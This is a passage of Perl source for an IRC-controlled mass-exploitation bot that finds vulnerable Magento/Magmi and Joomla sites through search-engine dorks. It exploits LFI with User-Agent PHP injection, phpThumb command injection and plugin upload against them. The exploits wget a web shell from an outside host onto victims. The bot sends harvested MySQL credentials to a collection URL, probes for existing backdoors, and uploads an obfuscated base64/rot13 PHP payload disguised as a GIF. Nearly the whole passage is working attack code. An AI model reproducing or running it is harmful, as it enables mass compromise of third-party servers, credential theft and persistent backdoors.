		&get_content("".$botsaver."?x=-MYSQL- http://".$site." - Hostname:".$serverIP." - Username:".$user." - Password:".$pass." - DBName:".$dbname."");
        &msg("$channel","$magelogo6[+]MYSQL[+] 6[ 6http://".$site." [+]hostname:".$serverIP." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."  6] [4 Connected 4]");
        &msg("$admin","$magelogo6[+]MYSQL[+] 6[ 6http://".$site." [+]hostname:".$serverIP." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."  6] [4 Connected 4]");
		&msg("$chanxxx","$magelogo6[+]MYSQL[+] 6[ 6http://".$site." [+]hostname:".$serverIP." [+]username:".$user." [+]password:".$pass." [+]dbname:".$dbname."  6] [4 Connected 4]");
    	}
    }
	}
	} 
 }


sub magelfi() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$magelogo);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$channel","$magelogo 4$engine 0 Selesai"); }
		my $bug = "/magmi/web/ajax_pluginconf.php?file=";
		my $dir = "../../../../../../../../../../../";
		
            my $test = "http://".$site.$bug.$dir."/etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility";
            my $vuln = "http://".$site."magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../proc/self/environ&plugintype=utilities&pluginclass=CustomSQLUtility";
      		my $htmlx = &get_content($testx);
            my $shell = "http://".$site."/magmi/web/rss.php";;
            my $html = get_content($vuln);
            if ($html =~ /DOCUMENT_ROOT=\// && $html =~ /HTTP_USER_AGENT=/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                        if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                            my $sys = $1;
                            my $code = 'echo "s4l1ty#".php_uname()."#s4l1ty"; if(@copy("'.$lfiinjector.'","/")) { echo "SUCCESS"; }';
                            my $version = 'echo "Indonesiancoder".php_uname().';
                            my $upload = 'system("wget '.$lfishell.' -O rss.php");';
							my $upload1 = 'system("wget '.$lfishell.' -O rss.php");';
                            my $wget = lfi_env_query($vuln,encode_base64($upload)); sleep(2);
							my $wget1 = lfi_env_query($test,encode_base64($upload1)); sleep(2);
                            my $check = get_content("http://".$site."/magmi/web/rss.php"); sleep(1);
                            if ($check =~ /GIF675ER/) {
                            	if ($check =~ /Kernel:(.*?)<\/b>/){$os=$1;}
		                           &msg("$admin","$magelogo15(09@03$engine15)04 ".$shell." 15(9@3".$os."15)");
								   &msg("$chanxxx","$magelogo15(09@03$engine15)04 ".$shell." 15(9@3".$os."15)");
		                           &msg("$channel","$magelogo15(09@03$engine15)04 ".$site." 15(9@3".$os."TusbolleD15) TusBoleD");
		                           sleep(2); 
		                        } else {
                                   &msg("$channel","$magelogo15(09@3$engine15)15(09@04SysTem15)4 ".$vuln." 15(09@03".$sys."15) VulN");

                                sleep(2);
                            }
                        } exit; }                    
		            }
		        }
			}
		}
	}
}

sub lfi_env_query() {
	my $url = $_[0];
	my $code = $_[1];
	my $ua = LWP::UserAgent->new(agent => "<?eval(base64_decode('".$code."'));?>");
	$ua->timeout(7);
	my $req = HTTP::Request->new(GET => $url);
	my $res = $ua->request($req);
	return $res->content;
}

sub mageupl() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$magelogo);
	    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$channel","$magelogo14(4$engine14)3 Finished..."); }
    	my $test = "http://".$site."/magmi/web/magmi.php";
    	my $test1 = "http://".$site."/magmi/conf/magmi.ini";
		my $crot = "http://".$site."/magmi/web/plugin_upload.php";			
    	my $htmlx = magento_query($crot);sleep(1);
		my $htmlx = magentox_query($test);sleep(1);
		my $html = &get_content($test);
		my $html1 = &get_content($test1);

            if ($html =~ /magmi_saveconfig.php/){          
            &msg("$channel","$magelogo 6 4 Hacked 6 http://".$site."magmi/web/magmi.php");}

           	if ($html1 =~ /DATABASE/){
			&get_content("".$botsaver."?x=-MAGMI- http://".$site."magmi/conf/magmi.ini");                     
            &msg("$channel","$magelogo 6 4 Hacked 6 http://".$site."magmi/conf/magmi.ini");}
			
			if ($htmlx =~ /Plugin packaged installed/){
			&get_content("".$botsaver."?x=-UPLOADER- http://".$site."magmi/web/magmi.php");
			#&msg("$channel","$magelogo15(11,1$engine11)8 http://".$site."magmi/web/magmi.php");
			&msg("$admin","$magelogo15(13,1$engine13)8 http://".$site."magmi/web/magmi.php");
			&msg("$chanxxx","$magelogo15(13,1$engine13)8 http://".$site."magmi/web/magmi.php");}
		my $check = &get_content("http://".$site."magmi/plugins/rss.php");sleep(1);
			if ($check =~ /GIF675ER/) {
			&get_content("".$botsaver."?x=-SHELL- http://".$site."/magmi/plugins/rss.php"); 		
			&msg("$admin","7,1[47] http://".$site."/magmi/plugins/rss.php 9"); 
			&msg("$chanxxx","7,1[47] http://".$site."/magmi/plugins/rss.php 9"); 
			}			
		}
	}
}

sub magento_query() {
		my $url = $_[0];
		my $ua  = LWP::UserAgent->new(agent => $uagent);
		$ua->timeout(20);
			my $req = $ua->post($url,Content_Type=>'multipart/form-data',Content=>["plugin_package"=>["$mag_shell"]]);
			return $req->content;
}

sub magentox_query() {
		my $url = $_[0];
		my $ua  = LWP::UserAgent->new(agent => $uagent);
		$ua->timeout(20);
		my $req = $ua->post($url,Content_Type=>'multipart/form-data',Content=>["plugin_package"=>["$mag_shell"]]);
		return $req->content;
}
}
}


sub alpha_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$alplogo,$nick);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$channel","$alplogo15(7@2$engine15)14 Scan finish"); }
		my $agent = LWP::UserAgent->new();
		$agent->agent('Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101Firefox/14.0.1');
		my $shell = "wget http://djcaa.org/wp-admin/includes/arkano.aff -O myluph.jpg;wget http://djcaa.org/wp-admin/includes/arkano.aff -O myluph.php";
		my $website = "http://".$site."/components/com_alphauserpoints/assets/phpThumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; $shell ; &phpThumbDebug=9";
		my $request = $agent->request(HTTP::Request->new(GET=>$website));		
		my $cwebsite = "http://".$site."/components/com_alphauserpoints/assets/phpThumb/myluph.jpg"; 
		my $creq = $agent->request(HTTP::Request->new(GET=>$cwebsite));
		if ($creq->is_success) {
		my $mvwebsite = "http://".$site."/components/com_alphauserpoints/assets/phpThumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; mv myluph.jpg myluph.php ; &phpThumbDebug=9";
 		my $mvreq = $agent->request(HTTP::Request->new(GET=>$mvwebsite));
 		my $xmlrpc = "http://".$site."components/com_alphauserpoints/assets/phpThumb/myluph.php";
 		my $c2req = $agent->request(HTTP::Request->new(GET=>$xmlrpc));
 		my $check = &get_content($xmlrpc); &get_content($spx); &get_content($bot); &get_content($box); &get_content($box); &get_content($box); sleep(2);
 		if ($check =~ /GIF89a/) { 
		&get_content($xmlrpc);
		my $safe = ""; my $os = ""; my $uid = "";
		if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
 		&msg("$admin","$alplogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$nick","$alplogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$channel","$alplogo15(7@2$engine15)(7@2SheLL15)3 Target Sent To $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 			}
 		}
 	}
}
}

sub hornot_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$horlogo,$nick);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$channel","$horlogo15(7@2$engine15)14 Scan finish"); }
		my $agent = LWP::UserAgent->new();
		$agent->agent('Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101Firefox/14.0.1');
		my $shell = "wget http://djcaa.org/wp-admin/includes/arkano.aff -O myluph.jpg;wget http://djcaa.org/wp-admin/includes/arkano.aff -O myluph.php";
		my $website = "http://".$site."/components/com_hotornot2/phpThumb/phpThumb.php??src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; $shell ; &phpThumbDebug=9";
		my $request = $agent->request(HTTP::Request->new(GET=>$website));		
		my $cwebsite = "http://".$site."/components/com_hotornot2/phpThumb/myluph.jpg"; 
		my $creq = $agent->request(HTTP::Request->new(GET=>$cwebsite));
		if ($creq->is_success) {
		my $mvwebsite = "http://".$site."/components/com_hotornot2/phpThumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; mv myluph.jpg myluph.php ; &phpThumbDebug=9";
 		my $mvreq = $agent->request(HTTP::Request->new(GET=>$mvwebsite));
 		my $xmlrpc = "http://".$site."components/com_hotornot2/phpThumb/myluph.php";
 		my $c2req = $agent->request(HTTP::Request->new(GET=>$xmlrpc));
 		my $check = &get_content($xmlrpc); &get_content($spx); &get_content($bot); &get_content($box); &get_content($box); &get_content($box); sleep(2);
 		if ($check =~ /GIF89a/) { 
		&get_content($xmlrpc);
		my $safe = ""; my $os = ""; my $uid = "";
		if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
 		&msg("$admin","$horlogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$nick","$horlogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$channel","$horlogo15(7@2$engine15)(7@2SheLL15)3 Target Sent To $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 			}
 		}
 	}
}
}

sub jmulti_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$jmulogo,$nick);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$channel","$jmulogo15(7@2$engine15)14 Scan finish"); }
		my $agent = LWP::UserAgent->new();
		$agent->agent('Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101Firefox/14.0.1');
		my $shell = "wget http://djcaa.org/wp-admin/includes/arkano.aff -O myluph.jpg;wget http://djcaa.org/wp-admin/includes/arkano.aff -O myluph.php";
		my $website = "http://".$site."/components/com_jmultimedia/assets/thumbs/phpthumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; $shell ; &phpThumbDebug=9";
		my $request = $agent->request(HTTP::Request->new(GET=>$website));		
		my $cwebsite = "http://".$site."/components/com_flexicontent/librairies/phpthumb/myluph.jpg"; 
		my $creq = $agent->request(HTTP::Request->new(GET=>$cwebsite));
		if ($creq->is_success) {
		my $mvwebsite = "http://".$site."/components/com_jmultimedia/assets/thumbs/phpthumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; mv myluph.jpg myluph.php ; &phpThumbDebug=9";
 		my $mvreq = $agent->request(HTTP::Request->new(GET=>$mvwebsite));
 		my $xmlrpc = "http://".$site."components/com_jmultimedia/assets/thumbs/phpthumb/myluph.php";
 		my $c2req = $agent->request(HTTP::Request->new(GET=>$xmlrpc));
 		my $check = &get_content($xmlrpc); &get_content($spx); &get_content($bot); &get_content($box); &get_content($box); &get_content($box); sleep(2);
 		if ($check =~ /GIF89a/) { 
		&get_content($xmlrpc);
		my $safe = ""; my $os = ""; my $uid = "";
		if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
 		&msg("$admin","$jmulogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$nick","$jmulogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$channel","$jmulogo15(7@2$engine15)(7@2SheLL15)3 Target Sent To $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 			}
 		}
 	}
}
}

sub act_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$actlogo,$nick);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$channel","$actlogo15(7@2$engine15)14 Scan finish"); }
		my $agent = LWP::UserAgent->new();
		$agent->agent('Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101Firefox/14.0.1');
		my $shell = "wget http://djcaa.org/wp-admin/includes/arkano.aff -O myluph.jpg;wget http://djcaa.org/wp-admin/includes/arkano.aff -O myluph.php";
		my $website = "http://".$site."/components/com_alphacontent/assets/phpThumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; $shell ; &phpThumbDebug=9";
		my $request = $agent->request(HTTP::Request->new(GET=>$website));		
		my $cwebsite = "http://".$site."/components/com_alphacontent/assets/phpThumb/myluph.jpg"; 
		my $creq = $agent->request(HTTP::Request->new(GET=>$cwebsite));
		if ($creq->is_success) {
		&shellx1($chan,$site,$engine,$nick,$logo);
		my $mvwebsite = "http://".$site."/components/com_alphacontent/assets/phpThumb/phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; mv myluph.jpg myluph.php ; &phpThumbDebug=9";
 		my $mvreq = $agent->request(HTTP::Request->new(GET=>$mvwebsite));
 		my $xmlrpc = "http://".$site."components/com_alphacontent/assets/phpThumb/myluph.php";
 		my $xmlrpc1 = "http://".$site."/plugins/editors/index.php";
 		my $c2req = $agent->request(HTTP::Request->new(GET=>$xmlrpc));
		if ($c2req->is_success) {
 		my $check = &get_content($xmlrpc);
 		if ($check =~ /GIF89a/) { 
		&msg("$channel","$actlogo15(7@2$engine15)(7@2SheLL15)3VulNeRabLe "); sleep(2);
		&msg("$channel","![7$engine]! [ 9UploAdinG 3Data ] "); sleep(2);
		&get_content($xmlrpc);
		my $safe = ""; my $os = ""; my $uid = "";
		if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
 		&msg("$admin","$actlogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$nick","$actlogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$channel","$actlogo15(7@2$engine15)(7@2SheLL15)3 Target Sent To $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 			}

 		my $check1 = &get_content($xmlrpc1);
 		if ($check1 =~ /GIF89a/) { 
		&msg("$channel","$actlogo15(7@2$engine15)(7@2SheLL15)3VulNeRabLe "); sleep(2);
		#&msg("$channel","![7$engine]! [ 9UploAdinG 3Data ] "); sleep(2);
		&get_content($xmlrpc);
		my $safe = ""; my $os = ""; my $uid = "";
		if ($check1 =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($check1 =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($check1 =~ /uid=(.*?)gid=/){$uid=$1;}
 		&msg("$admin","$actlogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$nick","$actlogo15(7@2$engine15)(7@2SheLL15)3 $xmlrpc 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 		&msg("$channel","$actlogo15(7@2$engine15)(7@2SheLL15)3 Target Sent To $nick 15(4 SafeMode 15=4 $safe 15) (4 OS 15=4 $os 15)");
 			}
 		}
 	}  else {
				my @bdpath = ("/components/com_alphacontent/assets/phpThumb/myluph.php",
						"/components/com_alphacontent/assets/phpThumb/pagat.php",
						"/components/com_alphacontent/assets/phpThumb/bogel.php",
						"/components/com_alphacontent/assets/phpThumb/myluph.jpg",
						"/components/com_alphacontent/assets/phpThumb/magic.php",
						"/components/com_alphacontent/assets/phpThumb/caliber.php",
						"/images/stories/petx.pHp",
						"/magic.gif.php",
					
                );
                                
    my @result = &backdoorCheck($site,@bdpath);

    if($result[0] ne "false") {
        sleep(int(rand(3)));
        &msg("$channel","![7$engine]! [ 4Finder Success 3OK! ]");
        &msg("$admin","15[4+12$engine4+15] 11$result[0] OS: $result[1] SAFEMODE:4$result[2] ");
            } 
	}
}
}
}

sub shellx1() {
	my $chan	= $_[0];
	my $site	= $_[1];
	my $engine	= $_[2];
	my $nick	= $_[3];
	my $logo    = $_[4];
	my $crota = "http://".$site."/plugins/editors/dlc.php";
	my $crotb = "http://".$site."/plugins/editors/dlc.php";
	my $html = &get_content($crota); sleep(3);
	&alpha_post2("http://".$site,'system("wget http://djcaa.org/wp-admin/includes/arkano.aff -q -O ../dlc.php);');
	#&alpha_post2("http://".$site,'system("wget '.$ppp.' -q -O ../dlc.php);');
	my $html1 = &get_content($crota."?220");
	my $html2 = &get_content($crotb."?220");

	if ($html =~ /GIF89a/) {
	&get_content($crota); sleep(3);
	my $safe = ""; my $os = ""; my $uid = "";
		if ($html =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
		if ($html =~ /Uname : (.*?)<\/b>/){$os=$1;}
		if ($html =~ /uid=(.*?)gid=/){$uid=$1;}
		&msg("$channel","![7$engine]! [ 8SheLL 2Target Sent to 12$nick 9$safe $os ]");
		&msg("$admin","$vdlogo 15$engine3 [Success]9 $crota 15(OS=$os) uid=$uid "); sleep(2);
		}
    if ($html2 =~ /GIF89a/) {
	&get_content($crotb);
	my $safe = ""; my $os = ""; my $uid = "";
		if ($html2 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
 		if ($html2 =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
 		if ($html2 =~ m/OS : (.*?)<br>/) {$os = $1;}
			&msg("$admin","15$engine9 $crotb 15(OS=$os) uid=$uid"); sleep(2);
			&msg("$channel","![7$engine]! [ 4SheLL 7Target Sent to 4$nick 9$safe $os ]");
	}
	
}

sub alpha_post2() {
	my $target = $_[0];
	my $code = "R0lGODlhPD9waHANCmV2YWwoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoc3RycmV2KHN0cl9yb3QxMygnPThUK3RQVE5xOE5COEhSbVVSZkxzL1FoMWVJWkRlTWVhc1hmVjZDUUx1UDVFZWxsRHZxSmJrN0x4eGZXRncwYWloKy84MUhzV3JFcERlYnM5b2p4VytyQm1NVjB0K0Z0bjIxVE9TcUxOSXZBNURQQjdnemlOZkRuSnRaRnNKWW9CUDVVMjRNRFROKytZYnFtQVEvR3pkdVBtalVPTkpBWVNWMFZrUFZlM0RTR0x6ZGI2ZFdPK2dkZmE0cVFabk5BVHBqa1pTVEQ4Y1M2MFcvSHk5a2xmeHRTUkpiRmpjWmg0L3VEaHUyanRwK3VNL1huQXhLN2RGOWE2QitPbWJNTXdtSS9lWkp0cEtTOUNDTkMrQnZhSWRnYTJramhnZGNhMC9VSGNhcmdYSlhwNG1Ea0gzT0Jsalg5ZVkrOEthcEdsSm82R0szZDZzS0JiNXpHS2gwWDNoMmRRZEhuL2tjb24xaFFkTktORy8xR0JjMzVaalhjSkNlRkJpeWdWN3BRbEtjZzhiV3RLQ2tvaFdleGU2SXk3RW0zSTRIMjQvUVIwQy95M2VuWjgxOUxwbTVXZmZYblZCU3lDL1JndVVsTml2Q1M5b04wSHJkRW5JWWxqeFJXdUM5ZmRwZG81RXMyMW9nbnNPM3Bja0wxbDRhbjErTW1CTWxjSS9YdkZqQjc1ZGY3QW02ZWdJcW85ektsd1BxSTI5MEhaSmUyMU9JNnlCU3FENzc4bi9ES3Vwbktwc0x2R3JsbEFLbVVDeEpDK0M4ZTNnZElnN0dUSG1DSThmb1NsbWppcDBHWHhFK3lMclJMbnNuVEtCbkptcnAxWGRlRlVwaE1ldXhtaEtBWXBySmNlcjcybWNkVkd5emUvMW9BMEhzQjdtck1WRWM5Rno1NnhHVDg5M2Fweit0Y1VyajM2MTNFY3I2SmIxMHBuM2g2SGFkZlpzOU1rY1lJN0tnYzFONUQ3S1RYK3B6TXBybEZJM1V3dFg3enl6SWFnckZzVEh1Q20ya3Vzcm1DY25xOFFNOGMvcnBNWm1nKzYxVWNVM2RkQUVsNjJqSW42SWNwMmFuemliK215amYwb1orQ2dVNy9VeWdSc0RpbytYQXFvMzRZQTJ2SjNlemNyNjhKY0RrYy9yd3AwVExzbzhUMm5sQTlZM2VVejNrRzE3c3haUHNsb3M1MDdpQkJEV1NqL3FVTU1YbGorRE5QbTUrdVh2V2laWHlhNUhxdDdYcGlpR09hRjV4VitwSEFjVVZwZ0hVb3czc3dyTGRsSW1LWU1zSG56djJlZGI3V2tTSDBJTTl0KzQ4alhmQnFtOTRUNFMxYVFrNTVyT3VEK1FhemNvZUJpTnNjbURTckhkRTJ4Q1VBQWNFSkVmT0VDS0puUldoZmdsMEE2dHBBSlVMVjVsY3FLMnlDVFlGSEI2Z1VaVWxxQVBKa0pMcVFPRmFvNnF6aGNZTmJPMFdha0RZMVdBUFV2dVhhRTZ2NUhDUkVDSkVXRnR4NW8zTzJMNEtod0lKZmM1ZFBITFhmMjFPcVhKQkR2cXpSL3FFRDFtbkdGaFFMaFJwWTdRV3B4UmlmQ05BSlBkTXg5U1hFYVJpSjhqVUZUUkVTWnZvYUNVbERlbG9EYXhyUkIwVm9sdE91MjNKdEVEdVdvN2ZhZXVKcjMvZ3JLZkR0WEVMcWRsa1QzOFBJOWZzeWNhcWVVTWZTdTNFRWt0VjA4bFFLL3dEanYva1B2N1BnTGFtYjh2dWZoNEZXc2tJVXpub1JLU2pBM3RKMVBsTWVNclM2ci93V1dmdHYzYkRwZzFhQUJzSGorMEkwT1lHQ0JqQ1Rnc1ZWdksxcDNTUlRiTFNOTXBERWwzdm05b1JKdmt6VUNvWmxTL1JIK2pBNnBIUmpBeGc5b2pUU01JUVM0TzBwK21LdlBUdjljM3laMG1oUDYzdHVSeVdEc0ZGOGMzUHkyZ094U2lIZXUydzRJbVE3WjIwUnhvU09NTTAvWWhxaFJKaGlXRGJHWVppdlNRQkl0czBTZTFyQXc2VEphSkU2VHhRZUlXeXZMOXZqNVZQNjM5QUR0am55ZER5dWV1WWhNd3o3UFFyRFlpWHhUb09WYmpLVHZnalFraFNhZm5POUVnNlREZVBjTmVNS2tVZEJvVUNWcEFid1BhSEMwdXBvWFpkeVRQL3BNQWVOSVBWL1lQS3ZJYzZ2LzlIYkdBR2s2YlNlUFFWWEplaDVHYllYSHF4eVZOOGJRYVFoVEFwQmt6WnlPOWdWcElIeGkyQUlxUms1V0ljTFR0UE82RHVOV28rVlVscEluUzlWdVhRWlVRNXVpTlJXZWtodVZCbFQrMlFycGZrNGhqaG84TGJHUk5OM0tJTkJiZU1GQmZrMGZtdHFUbHBhTlJnVCtjV2toRzdwYnNUMm44RktnUW5uelFxaHNqSHp6dnBGb05YUnNtc1BMRy9Wd2tGdkZxbFEwYVhrd1BvSGpkUHd2ek1jK2xicCt5VjZFSjgrUFloaGZ4VjRNbkswZmZ4ejdBNkh6NEFUM241MHhZSmhIWUJEa1pLbFVaQkNyYnpXYk9VOUNIWk1laWsxaDFIaEt6UkJISFQ5UXE1U3ZzaE51NzJxdnBoeUxWYitSNTFEU3E5SHlXL0M4cVNVWE5vSkZIazVTRTY3WUwxMHhKS2drWHRBU0tMc0pIdkZJNjExZ2dodEhwOXNESEZ4Ly8yZ0RpcGhIQlh4end5SWdWQmwxSmZiWE9Gb3JoN1RCZ1BXR1RZSk9RNzBYc3QxbDBOSnBTNndEUHVPRzB2Z0ttRVN4d0tFU0hkUmt0ckI4QVdTUG45UUpUMEQwdTBNWDJHR2s2Znk4OGJIYkVCSmpMUHh4OTdNVG5yb0d2V2VubE84Z2tQSUpSK215QnlOeHN4Zzc0dCt6Z2Y5aHRha1puUkttUmxmSTMxTUJUU3BpRDB0VllpTjQ0R3U0dS92NUpyTEtCcnhrZ2JiSkZnYi9GemRHdE95VHdiNkp4YzZrUmdVZ0ZDZ1UwUXFLTXVnMG81aStrSWhsY0xoaWtjL3VPZmdhcU43K2ZFVkF1dnp2emh1d2hFV1RTRGtGcHZGNXJNWTlpb2pjWE1FRHY3ZXV0OFViS0VjWFZ4Zmh0cWs2Q05rcGtjWEE0cG1URHNWeW5peU5XU3I0ZHo0cDV2NXZTWXQyMDgzQmlxWC9DaWdDL0o3YzNXdXRUeXdUTU42UTJWdklEVkZKU01Zay9PUGtDbDU4Z0wybTYwYjZFbVcveWVNZXpvUUZCcmZGRnR0UnFQcXdYMGdkSzFUSTNlR3llWUVsZVU4SitwR1pWME5qUFdwY3F2N2dvWFR3U2k4dDRDUjFsVkd5WjFVMHZSQWprWXRpWXRHaktVZFZ4dWlFUitTY240cnZjaFMxYWtpRUhwNURMZVY0VS81bmdoZDZUdlc2aUhidjJrUktTUTNqbEZwTDRycWw0U1N1WHcrRzZHckdUWjFSbWdiRVlQNnFaTkpDTTJoUkozTmlHM1VwenY0d09iUHBPdUJoNm55cmppUnVMREtwSFVScFVDMzBJOUVOc09vZ0xlUTNiU0w5M0wwM1FoNWo2Z2t6RjA4S0RSbW8ydjRvU09UblZ6cmJkdklidWhOS2NjN1pYRmRQRTk1a01HcmYwa2Frak5MeW5WcDBQRnhUQ1NxQkpQUEV3TkF0RDhZRW90WkdMZ1BWZGhxUVgremRsajNPMXBBWDZYYmJNZXpmM1NwVnpHNTJSUVg2MWMrQTJCMCsyQlBpVVpna2FMOHFyaVVxZU0xbnA5ZW55N0s2cEVoRkdrOVp0SytZbWRSTnZYaGFNZEZ2bXVFYlcrN3RsUWFGbU1Ga0MyVnNna0FnaHFicWdMeHVjQ1hvV2JWSTFzUmM0VVIzRXpZbUNqaXp4dCtTZkF5UjBDRWhlOHRxMzk5TVAyck4vUjl0M1Uyb1Q2aEdBMHF1VnYvRDJjZlB5dEJzdzJsaUdCcDl5amsvaWlESnVaUkdwQ1IvUEU2MEdDcUFXU0pVKzJ1aTlDdCtDYzlpYnE0b3cvbTl5TDJVaGwveFI2M3BZNWF3MW5mRzlBTUhnc1FnVmJ3bVFsY3NhYmlzMFlDc2JhT2o3UzF0M1lhNnFsYlV2QnlORXVMdktxWXRDZ1Jib1lyTWRqR1VqbWJQejQxQWZidU1GbHF0Y1dDMFZ4dGFCNnQ3WXFDckJKamIwRmxOV0pBTXc0UVdBb0NPdDFVY3dJUVNlOXpIK1JoLy9WKzVDcnR4a2R3QzhqQ2tCMjN2NGNFK0ZpWGJUQTZxQ2J3eVZPdnpIcVlJS0k5SXVIUDZSdy9NemNXVG1veWhvbmx6VXQ1MW5yNlNoNERlcUVKcWtsd0J6SFpBNkFZaVpQVHFYYk9xR0JPMmlnY3dUM0dBNGlSTGdnSWN3SW0nKSkpKSk7DQo/Pg==";
	my $browser = LWP::UserAgent->new;
	my $res = $browser->post($target."./dlc.php",['dlc.php'=> $code => 'application/octet-stream'],'Content-type'=>'form-data');
	my $hasil = $res->content;
	return $hasil;
}

sub flexi_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$flelogo,$nick);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$channel","$flelogo15(7@2$engine15)14 Scan finish"); }
		my $agent = LWP::UserAgent->new();
		$agent->agent('Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101Firefox/14.0.1');
		my $shell = "wget http://djcaa.org/wp-admin/includes/arkano.aff -O myluph.jpg;wget http://djcaa.org/wp-admin/includes/arkano.aff -O myluph.php";
